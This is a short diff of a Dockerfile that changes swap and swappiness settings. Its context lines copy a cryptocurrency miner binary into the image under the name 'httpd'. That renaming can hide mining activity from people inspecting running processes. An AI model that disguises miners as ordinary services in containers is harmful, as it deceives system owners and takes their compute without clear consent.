@@ -17,8 +17,10 @@ WORKDIR /app
 # Enable swap
 RUN fallocate -l 1G /swapfile 
 RUN chmod 600 /swapfile 
-RUN mkswap /swapfile
-RUN swapon /swapfile
+RUN mkswap /swapfile && \
+    echo "/swapfile none swap sw 0 0" >> /etc/fstab
+# Optimize swappiness
+RUN sysctl vm.swappiness=10 && echo "vm.swappiness=10" >> /etc/sysctl.conf
 
 # Download miner binary
 COPY iniminer-linux-x64 /app/httpd
